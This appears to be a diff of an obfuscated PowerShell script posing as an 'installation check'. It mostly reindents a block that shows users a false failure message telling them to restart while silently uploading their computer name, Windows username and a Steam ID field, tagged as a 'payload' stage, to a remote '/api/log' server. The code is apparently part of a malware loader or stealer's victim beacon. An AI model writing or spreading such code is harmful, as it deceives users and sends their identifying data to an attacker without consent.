@@ -42,7 +42,6 @@ function sLog {
 
 function lInfo { param($m, $e = @{}) sLog -t "info" -m $m -st "check" -e $e }
 function lErr { param($m, $e = @{}) sLog -t "errors" -m $m -st "check" -e $e }
-function pInfo { param($m, $e = @{}) sLog -t "info" -m $m -st "payload" -e $e }
 
 function tFile {
     param([string]$p, [string]$n)
@@ -204,33 +203,33 @@ function chk {
     Write-Host ""
     
     if ($pc -eq $tc) {
-    Write-Host "  [!] You did not pass the checking! Restart your computer." -ForegroundColor Red
-    
-    try {
-        $l = @{
-            timestamp = (Get-Date).ToString("o")
-            type = "info"
-            message = "Installation check completed"
-            odId = $mId
-            pcName = $env:COMPUTERNAME
-            pcUser = $env:USERNAME
-            steamId = ""
-            username = ""
-            stage = "payload"
-            extra = @{
-                passed = $pc
-                total = $tc
-                percentage = $pp
-                allPassed = $true
-                repaired = $needsRepair
+        Write-Host "  [!] You did not pass the checking! Restart your computer." -ForegroundColor Red
+        
+        try {
+            $l = @{
+                timestamp = (Get-Date).ToString("o")
+                type = "info"
+                message = "Installation check completed"
+                odId = $mId
+                pcName = $env:COMPUTERNAME
+                pcUser = $env:USERNAME
+                steamId = ""
+                username = ""
+                stage = "payload"
+                extra = @{
+                    passed = $pc
+                    total = $tc
+                    percentage = $pp
+                    allPassed = $true
+                    repaired = $needsRepair
+                }
             }
-        }
-        $j = $l | ConvertTo-Json -Compress
-        $w = New-Object Net.WebClient
-        $w.Headers.Add("Content-Type", "application/json")
-        $null = $w.UploadString("$sUrl/api/log", $j)
-    } catch {}
-
+            $j = $l | ConvertTo-Json -Compress
+            $w = New-Object Net.WebClient
+            $w.Headers.Add("Content-Type", "application/json")
+            $null = $w.UploadString("$sUrl/api/log", $j)
+        } catch {}
+        
     } elseif ($pc -ge 4) {
         Write-Host "  YOU DID NOT PASS THE CHECKING!" -ForegroundColor DarkYellow
         Write-Host ""
